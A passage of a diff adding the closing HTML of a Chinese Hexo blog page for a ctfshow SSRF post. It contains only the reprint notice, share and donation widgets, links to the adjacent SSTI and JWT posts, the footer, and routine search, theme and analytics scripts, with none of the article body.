+                    <a href="/about" rel="external nofollow noreferrer">Aurorabin</a>
+                </span>
+            </div>
+            <div class="reprint__type">
+                <span class="reprint-meta" style="font-weight: bold;">
+                    <i class="fas fa-link">
+                        文章链接:
+                    </i>
+                </span>
+                <span class="reprint-info">
+                    <a href="http://zeobi.github.io/2022/09/10/ssrf/">http://zeobi.github.io/2022/09/10/ssrf/</a>
+                </span>
+            </div>
+            <div class="reprint__notice">
+                <span class="reprint-meta" style="font-weight: bold;">
+                    <i class="fas fa-copyright">
+                        版权声明:
+                    </i>
+                </span>
+                <span class="reprint-info">
+                    本博客所有文章除特別声明外，均采用
+                    <a href="https://creativecommons.org/licenses/by/4.0/deed.zh" rel="external nofollow noreferrer" target="_blank">CC BY 4.0</a>
+                    许可协议。转载请注明来源
+                    <a href="/about" target="_blank">Aurorabin</a>
+                    !
+                </span>
+            </div>
+        
+    </div>
+
+    <script async defer>
+      document.addEventListener("copy", function (e) {
+        let toastHTML = '<span>复制成功，请遵循本文的转载规则</span><button class="btn-flat toast-action" onclick="navToReprintStatement()" style="font-size: smaller">查看</a>';
+        M.toast({html: toastHTML})
+      });
+
+      function navToReprintStatement() {
+        $("html, body").animate({scrollTop: $("#reprint-statement").offset().top - 80}, 800);
+      }
+    </script>
+
+
+
+            <div class="tag_share" style="display: block;">
+                <div class="post-meta__tag-list" style="display: inline-block;">
+                    
+                        <div class="article-tag">
+                            
+                                <a href="/tags/ctfshow/">
+                                    <span class="chip bg-color">ctfshow</span>
+                                </a>
+                            
+                        </div>
+                    
+                </div>
+                <div class="post_share" style="zoom: 80%; width: fit-content; display: inline-block; float: right; margin: -0.15rem 0;">
+                    <link rel="stylesheet" type="text/css" href="/libs/share/css/share.min.css">
+<div id="article-share">
+
+    
+    <div class="social-share" data-sites="twitter,facebook,google,qq,qzone,wechat,weibo,douban,linkedin" data-wechat-qrcode-helper="<p>微信扫一扫即可分享！</p>"></div>
+    <script src="/libs/share/js/social-share.min.js"></script>
+    
+
+    
+
+</div>
+
+                </div>
+            </div>
+            
+                <div id="reward">
+    <a href="#rewardModal" class="reward-link modal-trigger btn-floating btn-medium waves-effect waves-light red">赏</a>
+
+    <!-- Modal Structure -->
+    <div id="rewardModal" class="modal">
+        <div class="modal-content">
+            <a class="close modal-close"><i class="fas fa-times"></i></a>
+            <h4 class="reward-title">网络乞讨</h4>
+            <div class="reward-content">
+                <div class="reward-tabs">
+                    <ul class="tabs row">
+                        <li class="tab col s6 alipay-tab waves-effect waves-light"><a href="#alipay">支付宝</a></li>
+                        <li class="tab col s6 wechat-tab waves-effect waves-light"><a href="#wechat">微 信</a></li>
+                    </ul>
+                    <div id="alipay">
+                        <img src="/medias/reward/alipay.jpg" class="reward-img" alt="支付宝打赏二维码">
+                    </div>
+                    <div id="wechat">
+                        <img src="/medias/reward/wechat.png" class="reward-img" alt="微信打赏二维码">
+                    </div>
+                </div>
+            </div>
+        </div>
+    </div>
+</div>
+
+<script>
+    $(function () {
+        $('.tabs').tabs();
+    });
+</script>
+
+            
+        </div>
+    </div>
+
+    
+
+    
+
+    
+
+    
+
+    
+
+    
+
+    
+
+    
+
+    
+
+<article id="prenext-posts" class="prev-next articles">
+    <div class="row article-row">
+        
+        <div class="article col s12 m6" data-aos="fade-up">
+            <div class="article-badge left-badge text-color">
+                <i class="fas fa-chevron-left"></i>&nbsp;上一篇</div>
+            <div class="card">
+                <a href="/2022/09/11/ssti-mo-ban-zhu-ru/">
+                    <div class="card-image">
+                        
+                        
+                        <img src="/medias/featureimages/8.jpg" class="responsive-img" alt="SSTI模板注入">
+                        
+                        <span class="card-title">SSTI模板注入</span>
+                    </div>
+                </a>
+                <div class="card-content article-content">
+                    <div class="summary block-with-text">
+                        
+                            
+                        
+                    </div>
+                    <div class="publish-info">
+                        <span class="publish-date">
+                            <i class="far fa-clock fa-fw icon-date"></i>2022-09-11
+                        </span>
+                        <span class="publish-author">
+                            
+                            <i class="fas fa-user fa-fw"></i>
+                            Aurorabin
+                            
+                        </span>
+                    </div>
+                </div>
+                
+                <div class="card-action article-tags">
+                    
+                    <a href="/tags/ctfshow/">
+                        <span class="chip bg-color">ctfshow</span>
+                    </a>
+                    
+                </div>
+                
+            </div>
+        </div>
+        
+        
+        <div class="article col s12 m6" data-aos="fade-up">
+            <div class="article-badge right-badge text-color">
+                下一篇&nbsp;<i class="fas fa-chevron-right"></i>
+            </div>
+            <div class="card">
+                <a href="/2022/09/08/jwt/">
+                    <div class="card-image">
+                        
+                        
+                        <img src="/medias/featureimages/23.jpg" class="responsive-img" alt="JWT">
+                        
+                        <span class="card-title">JWT</span>
+                    </div>
+                </a>
+                <div class="card-content article-content">
+                    <div class="summary block-with-text">
+                        
+                            
+                        
+                    </div>
+                    <div class="publish-info">
+                            <span class="publish-date">
+                                <i class="far fa-clock fa-fw icon-date"></i>2022-09-08
+                            </span>
+                        <span class="publish-author">
+                            
+                            <i class="fas fa-user fa-fw"></i>
+                            Aurorabin
+                            
+                        </span>
+                    </div>
+                </div>
+                
+                <div class="card-action article-tags">
+                    
+                    <a href="/tags/ctfshow/">
+                        <span class="chip bg-color">ctfshow</span>
+                    </a>
+                    
+                </div>
+                
+            </div>
+        </div>
+        
+    </div>
+</article>
+
+</div>
+
+
+
+<!-- 代码块功能依赖 -->
+<script type="text/javascript" src="/libs/codeBlock/codeBlockFuction.js"></script>
+
+
+  <!-- 是否加载使用自带的 prismjs. -->
+  <script type="text/javascript" src="/libs/prism/prism.min.js"></script>
+
+
+<!-- 代码语言 -->
+
+<script type="text/javascript" src="/libs/codeBlock/codeLang.js"></script>
+
+
+<!-- 代码块复制 -->
+
+<script type="text/javascript" src="/libs/codeBlock/codeCopy.js"></script>
+
+
+<!-- 代码块收缩 -->
+
+<script type="text/javascript" src="/libs/codeBlock/codeShrink.js"></script>
+
+
+
+    </div>
+    <div id="toc-aside" class="expanded col l3 hide-on-med-and-down">
+        <div class="toc-widget card" style="background-color: white;">
+            <div class="toc-title"><i class="far fa-list-alt"></i>&nbsp;&nbsp;目录</div>
+            <div id="toc-content"></div>
+        </div>
+    </div>
+</div>
+
+<!-- TOC 悬浮按钮. -->
+
+<div id="floating-toc-btn" class="hide-on-med-and-down">
+    <a class="btn-floating btn-large bg-color">
+        <i class="fas fa-list-ul"></i>
+    </a>
+</div>
+
+
+<script src="/libs/tocbot/tocbot.min.js"></script>
+<script>
+    $(function () {
+        tocbot.init({
+            tocSelector: '#toc-content',
+            contentSelector: '#articleContent',
+            headingsOffset: -($(window).height() * 0.4 - 45),
+            collapseDepth: Number('0'),
+            headingSelector: 'h2, h3, h4'
+        });
+
+        // Set scroll toc fixed.
+        let tocHeight = parseInt($(window).height() * 0.4 - 64);
+        let $tocWidget = $('.toc-widget');
+        $(window).scroll(function () {
+            let scroll = $(window).scrollTop();
+            /* add post toc fixed. */
+            if (scroll > tocHeight) {
+                $tocWidget.addClass('toc-fixed');
+            } else {
+                $tocWidget.removeClass('toc-fixed');
+            }
+        });
+
+        
+        /* 修复文章卡片 div 的宽度. */
+        let fixPostCardWidth = function (srcId, targetId) {
+            let srcDiv = $('#' + srcId);
+            if (srcDiv.length === 0) {
+                return;
+            }
+
+            let w = srcDiv.width();
+            if (w >= 450) {
+                w = w + 21;
+            } else if (w >= 350 && w < 450) {
+                w = w + 18;
+            } else if (w >= 300 && w < 350) {
+                w = w + 16;
+            } else {
+                w = w + 14;
+            }
+            $('#' + targetId).width(w);
+        };
+
+        // 切换TOC目录展开收缩的相关操作.
+        const expandedClass = 'expanded';
+        let $tocAside = $('#toc-aside');
+        let $mainContent = $('#main-content');
+        $('#floating-toc-btn .btn-floating').click(function () {
+            if ($tocAside.hasClass(expandedClass)) {
+                $tocAside.removeClass(expandedClass).hide();
+                $mainContent.removeClass('l9');
+            } else {
+                $tocAside.addClass(expandedClass).show();
+                $mainContent.addClass('l9');
+            }
+            fixPostCardWidth('artDetail', 'prenext-posts');
+        });
+        
+    });
+</script>
+
+    
+
+</main>
+
+
+
+
+    <footer class="page-footer bg-color">
+    
+        <link rel="stylesheet" href="/libs/aplayer/APlayer.min.css">
+<style>
+    .aplayer .aplayer-lrc p {
+        
+        display: none;
+        
+        font-size: 12px;
+        font-weight: 700;
+        line-height: 16px !important;
+    }
+
+    .aplayer .aplayer-lrc p.aplayer-lrc-current {
+        
+        display: none;
+        
+        font-size: 15px;
+        color: #42b983;
+    }
+
+    
+    .aplayer.aplayer-fixed.aplayer-narrow .aplayer-body {
+        left: -66px !important;
+    }
+
+    .aplayer.aplayer-fixed.aplayer-narrow .aplayer-body:hover {
+        left: 0px !important;
+    }
+
+    
+</style>
+<div class="">
+    
+    <div class="row">
+        <meting-js class="col l8 offset-l2 m10 offset-m1 s12"
+                   server="netease"
+                   type="playlist"
+                   id="503838841"
+                   fixed='true'
+                   autoplay='false'
+                   theme='#42b983'
+                   loop='all'
+                   order='random'
+                   preload='auto'
+                   volume='0.7'
+                   list-folded='true'
+        >
+        </meting-js>
+    </div>
+</div>
+
+<script src="/libs/aplayer/APlayer.min.js"></script>
+<script src="/libs/aplayer/Meting.min.js"></script>
+
+    
+
+    <div class="container row center-align"
+         style="margin-bottom: 0px !important;">
+        <div class="col s12 m8 l8 copy-right">
+            Copyright&nbsp;&copy;
+            
+                <span id="year">2019-2022</span>
+            
+            <a href="/about" target="_blank">Aurorabin</a>
+            |&nbsp;Powered by&nbsp;<a href="https://hexo.io/" target="_blank">Hexo</a>
+            |&nbsp;Theme&nbsp;<a href="https://github.com/blinkfox/hexo-theme-matery" target="_blank">Matery</a>
+            <br>
+            
+            
+            
+                
+            
+            
+                <span id="busuanzi_container_site_pv">
+                &nbsp;|&nbsp;<i class="far fa-eye"></i>&nbsp;总访问量:&nbsp;
+                    <span id="busuanzi_value_site_pv" class="white-color"></span>
+            </span>
+            
+            
+                <span id="busuanzi_container_site_uv">
+                &nbsp;|&nbsp;<i class="fas fa-users"></i>&nbsp;总访问人数:&nbsp;
+                    <span id="busuanzi_value_site_uv" class="white-color"></span>
+            </span>
+            
+            <br>
+
+            <!-- 运行天数提醒. -->
+            
+            <br>
+            
+        </div>
+        <div class="col s12 m4 l4 social-link social-statis">
+    <a href="https://github.com/zeobi" class="tooltipped" target="_blank" data-tooltip="访问我的GitHub" data-position="top" data-delay="50">
+        <i class="fab fa-github"></i>
+    </a>
+
+
+
+    <a href="mailto:877199409@qq.com" class="tooltipped" target="_blank" data-tooltip="邮件联系我" data-position="top" data-delay="50">
+        <i class="fas fa-envelope-open"></i>
+    </a>
+
+
+
+
+
+
+
+    <a href="tencent://AddContact/?fromId=50&fromSubId=1&subcmd=all&uin=877199409" class="tooltipped" target="_blank" data-tooltip="QQ联系我: 877199409" data-position="top" data-delay="50">
+        <i class="fab fa-qq"></i>
+    </a>
+
+
+
+
+
+
+
+</div>
+    </div>
+</footer>
+
+<div class="progress-bar"></div>
+
+
+    <!-- 搜索遮罩框 -->
+<div id="searchModal" class="modal">
+    <div class="modal-content">
+        <div class="search-header">
+            <span class="title"><i class="fas fa-search"></i>&nbsp;&nbsp;搜索</span>
+            <input type="search" id="searchInput" name="s" placeholder="请输入搜索的关键字"
+                   class="search-input">
+        </div>
+        <div id="searchResult"></div>
+    </div>
+</div>
+
+<script type="text/javascript">
+$(function () {
+    var searchFunc = function (path, search_id, content_id) {
+        'use strict';
+        $.ajax({
+            url: path,
+            dataType: "xml",
+            success: function (xmlResponse) {
+                // get the contents from search data
+                var datas = $("entry", xmlResponse).map(function () {
+                    return {
+                        title: $("title", this).text(),
+                        content: $("content", this).text(),
+                        url: $("url", this).text()
+                    };
+                }).get();
+                var $input = document.getElementById(search_id);
+                var $resultContent = document.getElementById(content_id);
+                $input.addEventListener('input', function () {
+                    var str = '<ul class=\"search-result-list\">';
+                    var keywords = this.value.trim().toLowerCase().split(/[\s\-]+/);
+                    $resultContent.innerHTML = "";
+                    if (this.value.trim().length <= 0) {
+                        return;
+                    }
+                    // perform local searching
+                    datas.forEach(function (data) {
+                        var isMatch = true;
+                        var data_title = data.title.trim().toLowerCase();
+                        var data_content = data.content.trim().replace(/<[^>]+>/g, "").toLowerCase();
+                        var data_url = data.url;
+                        data_url = data_url.indexOf('/') === 0 ? data.url : '/' + data_url;
+                        var index_title = -1;
+                        var index_content = -1;
+                        var first_occur = -1;
+                        // only match artiles with not empty titles and contents
+                        if (data_title !== '' && data_content !== '') {
+                            keywords.forEach(function (keyword, i) {
+                                index_title = data_title.indexOf(keyword);
+                                index_content = data_content.indexOf(keyword);
+                                if (index_title < 0 && index_content < 0) {
+                                    isMatch = false;
+                                } else {
+                                    if (index_content < 0) {
+                                        index_content = 0;
+                                    }
+                                    if (i === 0) {
+                                        first_occur = index_content;
+                                    }
+                                }
+                            });
+                        }
+                        // show search results
+                        if (isMatch) {
+                            str += "<li><a href='" + data_url + "' class='search-result-title'>" + data_title + "</a>";
+                            var content = data.content.trim().replace(/<[^>]+>/g, "");
+                            if (first_occur >= 0) {
+                                // cut out 100 characters
+                                var start = first_occur - 20;
+                                var end = first_occur + 80;
+                                if (start < 0) {
+                                    start = 0;
+                                }
+                                if (start === 0) {
+                                    end = 100;
+                                }
+                                if (end > content.length) {
+                                    end = content.length;
+                                }
+                                var match_content = content.substr(start, end);
+                                // highlight all keywords
+                                keywords.forEach(function (keyword) {
+                                    var regS = new RegExp(keyword, "gi");
+                                    match_content = match_content.replace(regS, "<em class=\"search-keyword\">" + keyword + "</em>");
+                                });
+
+                                str += "<p class=\"search-result\">" + match_content + "...</p>"
+                            }
+                            str += "</li>";
+                        }
+                    });
+                    str += "</ul>";
+                    $resultContent.innerHTML = str;
+                });
+            }
+        });
+    };
+
+    searchFunc('/search.xml', 'searchInput', 'searchResult');
+});
+</script>
+
+    <!-- 白天和黑夜主题 -->
+<div class="stars-con">
+    <div id="stars"></div>
+    <div id="stars2"></div>
+    <div id="stars3"></div>  
+</div>
+
+<script>
+    function switchNightMode() {
+        $('<div class="Cuteen_DarkSky"><div class="Cuteen_DarkPlanet"></div></div>').appendTo($('body')),
+        setTimeout(function () {
+            $('body').hasClass('DarkMode') 
+            ? ($('body').removeClass('DarkMode'), localStorage.setItem('isDark', '0'), $('#sum-moon-icon').removeClass("fa-sun").addClass('fa-moon')) 
+            : ($('body').addClass('DarkMode'), localStorage.setItem('isDark', '1'), $('#sum-moon-icon').addClass("fa-sun").removeClass('fa-moon')),
+            
+            setTimeout(function () {
+            $('.Cuteen_DarkSky').fadeOut(1e3, function () {
+                $(this).remove()
+            })
+            }, 2e3)
+        })
+    }
+</script>
+
+    <!-- 回到顶部按钮 -->
+<div id="backTop" class="top-scroll">
+    <a class="btn-floating btn-large waves-effect waves-light" href="#!">
+        <i class="fas fa-arrow-up"></i>
+    </a>
+</div>
+
+
+    <script src="/libs/materialize/materialize.min.js"></script>
+    <script src="/libs/masonry/masonry.pkgd.min.js"></script>
+    <script src="/libs/aos/aos.js"></script>
+    <script src="/libs/scrollprogress/scrollProgress.min.js"></script>
+    <script src="/libs/lightGallery/js/lightgallery-all.min.js"></script>
+    <script src="/js/matery.js"></script>
+
+    
+
+    
+        
+        <script type="text/javascript">
+            // 只在桌面版网页启用特效
+            var windowWidth = $(window).width();
+            if (windowWidth > 768) {
+                document.write('<script type="text/javascript" src="/libs/others/sakura-reduce.js"><\/script>');
+            }
+        </script>
+    
+
+    <!-- 雪花特效 -->
+    
+
+    <!-- 鼠标星星特效 -->
+    
+
+     
+        <script src="https://ssl.captcha.qq.com/TCaptcha.js"></script>
+        <script src="/libs/others/TencentCaptcha.js"></script>
+        <button id="TencentCaptcha" data-appid="xxxxxxxxxx" data-cbfn="callback" type="button" hidden></button>
+    
+
+    <!-- Baidu Analytics -->
+
+    <!-- Baidu Push -->
+
+<script>
+    (function () {
+        var bp = document.createElement('script');
+        var curProtocol = window.location.protocol.split(':')[0];
+        if (curProtocol === 'https') {
+            bp.src = 'https://zz.bdstatic.com/linksubmit/push.js';
+        } else {
+            bp.src = 'http://push.zhanzhang.baidu.com/push.js';
+        }
+        var s = document.getElementsByTagName("script")[0];
+        s.parentNode.insertBefore(bp, s);
+    })();
+</script>
+
+    
+    
+    <script async src="/libs/others/busuanzi.pure.mini.js"></script>
+    
+
+    
+
+    
+
+    <!--腾讯兔小巢-->
+    
+    
+
+    
+
+    
+
+    
+    <script src="/libs/instantpage/instantpage.js" type="module"></script>
+    
+
+</body>
+
+</html>
